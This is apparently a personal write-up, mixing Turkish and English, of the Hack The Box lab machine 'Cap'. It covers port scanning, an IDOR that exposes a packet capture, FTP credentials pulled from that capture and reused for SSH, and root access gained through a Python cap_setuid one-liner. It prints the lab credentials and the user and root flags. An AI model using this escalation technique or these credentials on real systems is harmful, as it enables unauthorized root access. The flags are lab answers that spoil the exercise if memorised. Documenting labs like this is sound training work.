
# HTB Linux Cap

IP=`10.10.10.245`

-----------------------------------------------------------------------------------

# Enum
```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0
80/tcp open  http    syn-ack ttl 63 Gunicorn
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn
|_http-title: Security Dashboard
```

ports: `21,22,80`

-----------------------------------------------------------------------------------

# WEB

## IDOR
bu urlde IDOR var: `http://10.10.10.245/data/0`
pcap dosyası var.

## netstat verisi
bir sayfada sunucunun netstat -noa'sı var
```bash
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1001       36168      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        33585      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          34767      -                    off (0.00/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:60274      TIME_WAIT   0          0          -                    timewait (46.10/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49584      TIME_WAIT   0          0          -                    timewait (59.16/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:60304      TIME_WAIT   0          0          -                    timewait (46.18/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:60294      TIME_WAIT   0          0          -                    timewait (46.24/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49576      TIME_WAIT   0          0          -                    timewait (59.14/0/0)
tcp        0      0 10.10.10.245:22         10.10.15.43:60592       ESTABLISHED 0          98557      -                    keepalive (1980.98/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:56154      TIME_WAIT   0          0          -                    timewait (1.90/0/0)
tcp        0      0 10.10.10.245:22         10.10.15.43:34194       ESTABLISHED 0          142944     -                    keepalive (3321.91/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49766      TIME_WAIT   0          0          -                    timewait (36.94/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49614      ESTABLISHED 1001       158189     -                    off (0.00/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49596      TIME_WAIT   0          0          -                    timewait (59.15/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49788      TIME_WAIT   0          0          -                    timewait (36.94/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:60272      TIME_WAIT   0          0          -                    timewait (46.24/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49776      TIME_WAIT   0          0          -                    timewait (36.94/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49744      TIME_WAIT   0          0          -                    timewait (37.88/0/0)
tcp        0      0 10.10.10.245:22         10.10.15.43:43120       ESTABLISHED 0          139093     -                    keepalive (2596.04/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49754      TIME_WAIT   0          0          -                    timewait (37.89/0/0)
tcp        0      0 10.10.10.245:22         10.10.15.43:38596       ESTABLISHED 0          141862     -                    keepalive (3078.98/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:60282      TIME_WAIT   0          0          -                    timewait (46.10/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:60314      TIME_WAIT   0          0          -                    timewait (46.18/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49768      TIME_WAIT   0          0          -                    timewait (36.94/0/0)
tcp        0      0 10.10.10.245:22         10.10.15.43:46870       ESTABLISHED 0          98863      -                    keepalive (2136.56/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49600      TIME_WAIT   0          0          -                    timewait (59.17/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49608      TIME_WAIT   0          0          -                    timewait (59.15/0/0)
tcp        0      0 10.10.10.245:22         10.10.15.43:43118       ESTABLISHED 0          143357     -                    keepalive (4007.53/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:60306      TIME_WAIT   0          0          -                    timewait (46.18/0/0)
tcp        0      0 10.10.10.245:80         10.10.15.168:49604      TIME_WAIT   0          0          -                    timewait (59.13/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      0          34732      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      0          34769      -                    off (0.00/0/0)
tcp6       0      0 10.10.10.245:21         10.10.16.122:59472      ESTABLISHED 0          156993     -                    keepalive (7139.26/0/0)
tcp6       0      0 10.10.10.245:26282      10.10.16.122:59536      TIME_WAIT   0          0          -                    timewait (7.70/0/0)
udp        0      0 10.10.10.245:36434      1.1.1.1:53              ESTABLISHED 1001       61881      13191/bash           off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        33584      -                    off (0.00/0/0)
udp        0      0 10.10.10.245:33976      1.1.1.1:53              ESTABLISHED 101        157129     -                    off (0.00/0/0)
udp        0      0 127.0.0.1:42187         127.0.0.53:53           ESTABLISHED 102        157231     -                    off (0.00/0/0)
udp        0      0 10.10.10.245:43375      1.1.1.1:53              ESTABLISHED 1001       113812     49404/bash           off (0.00/0/0)
udp        0      0 10.10.10.245:49650      1.1.1.1:53              ESTABLISHED 101        157130     -                    off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     27773    -                    /run/udev/control
unix  2      [ ]         DGRAM                    42229    1821/systemd         /run/user/1001/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     42232    1821/systemd         /run/user/1001/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     42238    1821/systemd         /run/user/1001/bus
unix  2      [ ACC ]     STREAM     LISTENING     42239    1821/systemd         /run/user/1001/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     42240    1821/systemd         /run/user/1001/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     42242    1821/systemd         /run/user/1001/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     27757    -                    @/org/kernel/linux/storage/multipathd
unix  2      [ ACC ]     STREAM     LISTENING     42243    1821/systemd         /run/user/1001/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     42244    1821/systemd         /run/user/1001/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     42245    1821/systemd         /run/user/1001/pk-debconf-socket
unix  2      [ ACC ]     STREAM     LISTENING     42246    1821/systemd         /run/user/1001/snapd-session-agent.socket
unix  3      [ ]         DGRAM                    27741    -                    /run/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     27744    -                    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     27746    -                    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     27755    -                    /run/lvm/lvmpolld.socket
unix  2      [ ]         DGRAM                    27758    -                    /run/systemd/journal/syslog
unix  15     [ ]         DGRAM                    27766    -                    /run/systemd/journal/dev-log
unix  2      [ ACC ]     STREAM     LISTENING     27768    -                    /run/systemd/journal/stdout
unix  9      [ ]         DGRAM                    27770    -                    /run/systemd/journal/socket
unix  2      [ ACC ]     STREAM     LISTENING     27980    -                    /run/systemd/journal/io.systemd.journal
unix  2      [ ACC ]     STREAM     LISTENING     30635    -                    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     30623    -                    /run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     30637    -                    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     30633    -                    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     34362    -                    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     33248    -                    /run/irqbalance//irqbalance1025.sock
unix  2      [ ACC ]     STREAM     LISTENING     30627    -                    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     30628    -                    /var/snap/lxd/common/lxd/unix.socket
unix  3      [ ]         STREAM     CONNECTED     32088    -                    
unix  3      [ ]         STREAM     CONNECTED     33245    -                    
unix  3      [ ]         STREAM     CONNECTED     35115    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     95134    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     33006    -                    
unix  2      [ ]         DGRAM                    34487    -                    
unix  3      [ ]         STREAM     CONNECTED     97549    -                    
unix  3      [ ]         STREAM     CONNECTED     33495    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     42201    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    139163   -                    
unix  3      [ ]         STREAM     CONNECTED     33092    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    143917   -                    
unix  3      [ ]         STREAM     CONNECTED     33166    -                    
unix  3      [ ]         STREAM     CONNECTED     33246    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     32089    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     35554    72094/sh             
unix  3      [ ]         STREAM     CONNECTED     95138    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     36152    -                    
unix  3      [ ]         STREAM     CONNECTED     28234    -                    
unix  2      [ ]         STREAM     CONNECTED     98576    -                    
unix  3      [ ]         STREAM     CONNECTED     139244   -                    
unix  3      [ ]         STREAM     CONNECTED     95121    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     96408    -                    
unix  2      [ ]         DGRAM                    98603    -                    
unix  3      [ ]         STREAM     CONNECTED     36149    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     35542    -                    
unix  3      [ ]         STREAM     CONNECTED     42194    1821/systemd         
unix  3      [ ]         STREAM     CONNECTED     35964    -                    
unix  3      [ ]         STREAM     CONNECTED     35965    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31771    -                    
unix  2      [ ]         DGRAM                    142124   -                    
unix  3      [ ]         STREAM     CONNECTED     36151    -                    
unix  3      [ ]         STREAM     CONNECTED     139243   -                    
unix  3      [ ]         STREAM     CONNECTED     97548    -                    
unix  3      [ ]         STREAM     CONNECTED     96316    -                    
unix  3      [ ]         STREAM     CONNECTED     96411    -                    
unix  3      [ ]         STREAM     CONNECTED     32028    -                    
unix  3      [ ]         STREAM     CONNECTED     142674   -                    
unix  3      [ ]         STREAM     CONNECTED     28724    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    28084    -                    
unix  2      [ ]         STREAM     CONNECTED     142096   -                    
unix  3      [ ]         STREAM     CONNECTED     33011    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31772    -                    
unix  3      [ ]         STREAM     CONNECTED     36076    -                    
unix  2      [ ]         DGRAM                    34527    -                    
unix  3      [ ]         STREAM     CONNECTED     35114    -                    
unix  3      [ ]         STREAM     CONNECTED     142675   -                    
unix  3      [ ]         STREAM     CONNECTED     36148    -                    
unix  3      [ ]         STREAM     CONNECTED     32379    -                    
unix  3      [ ]         STREAM     CONNECTED     35543    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34488    -                    
unix  3      [ ]         DGRAM                    27742    -                    
unix  3      [ ]         STREAM     CONNECTED     32448    -                    
unix  3      [ ]         STREAM     CONNECTED     36077    -                    /run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    27743    -                    
unix  3      [ ]         STREAM     CONNECTED     33492    -                    /run/dbus/system_bus_socket
unix  2      [ ]         STREAM     CONNECTED     144400   -                    
unix  3      [ ]         STREAM     CONNECTED     95131    -                    
unix  3      [ ]         STREAM     CONNECTED     33491    -                    
unix  3      [ ]         STREAM     CONNECTED     157736   -                    
unix  2      [ ]         DGRAM                    32254    -                    
unix  2      [ ]         DGRAM                    142487   -                    
unix  3      [ ]         STREAM     CONNECTED     31775    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     32380    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    32258    -                    
unix  3      [ ]         STREAM     CONNECTED     32307    -                    
unix  3      [ ]         STREAM     CONNECTED     142302   -                    
unix  3      [ ]         STREAM     CONNECTED     33168    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     97868    -                    
unix  3      [ ]         STREAM     CONNECTED     55787    8102/dbus-daemon     
unix  2      [ ]         DGRAM                    157708   -                    
unix  3      [ ]         STREAM     CONNECTED     28097    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     27578    -                    
unix  3      [ ]         STREAM     CONNECTED     56398    8102/dbus-daemon     
unix  3      [ ]         STREAM     CONNECTED     35980    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     35555    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    32259    -                    
unix  3      [ ]         STREAM     CONNECTED     33493    -                    /run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    42212    -                    
unix  3      [ ]         STREAM     CONNECTED     144113   -                    
unix  3      [ ]         DGRAM                    27590    -                    
unix  2      [ ]         DGRAM                    28725    -                    
unix  3      [ ]         STREAM     CONNECTED     55788    8102/dbus-daemon     
unix  3      [ ]         DGRAM                    42230    1821/systemd         
unix  2      [ ]         STREAM     CONNECTED     142444   -                    
unix  3      [ ]         DGRAM                    28730    -                    
unix  3      [ ]         STREAM     CONNECTED     33583    -                    /run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    97689    -                    
unix  2      [ ]         DGRAM                    55780    8102/dbus-daemon     
unix  3      [ ]         STREAM     CONNECTED     30626    -                    
unix  3      [ ]         STREAM     CONNECTED     55790    8102/dbus-daemon     /run/user/1001/bus
unix  3      [ ]         STREAM     CONNECTED     42234    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     34358    -                    
unix  2      [ ]         DGRAM                    27984    -                    
unix  2      [ ]         DGRAM                    30515    -                    
unix  3      [ ]         STREAM     CONNECTED     96320    -                    /run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    37766    -                    
unix  3      [ ]         STREAM     CONNECTED     55767    1821/systemd         
unix  3      [ ]         STREAM     CONNECTED     33490    -                    
unix  3      [ ]         STREAM     CONNECTED     62767    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     144112   -                    
unix  2      [ ]         DGRAM                    27587    -                    
unix  3      [ ]         DGRAM                    28731    -                    
unix  2      [ ]         DGRAM                    33489    -                    
unix  3      [ ]         STREAM     CONNECTED     30652    -                    
unix  3      [ ]         STREAM     CONNECTED     29968    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    42231    1821/systemd         
unix  2      [ ]         STREAM     CONNECTED     97664    -                    
unix  3      [ ]         STREAM     CONNECTED     97869    -                    
unix  3      [ ]         STREAM     CONNECTED     55776    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     33582    -                    
unix  3      [ ]         DGRAM                    32257    -                    
unix  3      [ ]         STREAM     CONNECTED     42233    1821/systemd         
unix  3      [ ]         STREAM     CONNECTED     31776    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34785    -                    
unix  3      [ ]         DGRAM                    28729    -                    
unix  2      [ ]         STREAM     CONNECTED     140815   -                    
unix  3      [ ]         STREAM     CONNECTED     63831    -                    
unix  3      [ ]         DGRAM                    32260    -                    
unix  3      [ ]         STREAM     CONNECTED     32029    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    32924    -                    
unix  3      [ ]         DGRAM                    28732    -                    
unix  2      [ ]         DGRAM                    41635    1821/systemd         
unix  3      [ ]         DGRAM                    27589    -                    
unix  3      [ ]         STREAM     CONNECTED     32449    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     33494    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     30836    -                    
unix  3      [ ]         STREAM     CONNECTED     157737   -                    
unix  2      [ ]         DGRAM                    34778    -                    
unix  3      [ ]         STREAM     CONNECTED     142303   -
```

-----------------------------------------------------------------------------------

# PCAP analizi
strings ile baktım.
```bash
USER nathan
(su@
Jsv@
331 Please specify the password.
PASS Buck3tH4TF0RM3!
```

## FTP CREDS: `nathan:Buck3tH4TF0RM3!`

-----------------------------------------------------------------------------------

# FTP

nathan ile
```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||8477|
150 Here comes the directory listing.
drwxr-xr-x    5 1001     1001         4096 Oct 28 15:52 .
drwxr-xr-x    3 0        0            4096 May 23  2021 ..
lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23  2021 .cache
drwx------    3 1001     1001         4096 Oct 28 16:37 .gnupg
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
drwxr-xr-x    3 1001     1001         4096 Oct 28 15:52 snap
-r--------    1 1001     1001           33 Oct 28 15:02 user.txt

```

# user.txt `7adb95eec4751153964f790807c57d7d`

-----------------------------------------------------------------------------------

# SSH
bu gerizekalı nathan'ın ssh passiyle ftp pass aynı

## SSH CREDS: `nathan:Buck3tH4TF0RM3!`

-----------------------------------------------------------------------------------

# Privesc
## linpeas: `CVE:2021-3560` var dedi.
polkit : policy kit isimli bir local unix programında arbitirary local admin oluşturulabiliniyormuş
https://www.exploit-db.com/exploits/50011
* bash nedense takılıp kaldı
* c dosyası dependencies olmadığı için çalışmadı
* olmuyor

## linpeas
capability vuln var diyor.

`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`

setuid capabilitysi olduğu için direkt shell spawn sonra setuid 0 yap.
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

# root.txt: `ec95ec837ecde75a40f0637093776f2d`

-----------------------------------------------------------------------------------

-----------------------------------------------------------------------------------

-----------------------------------------------------------------------------------
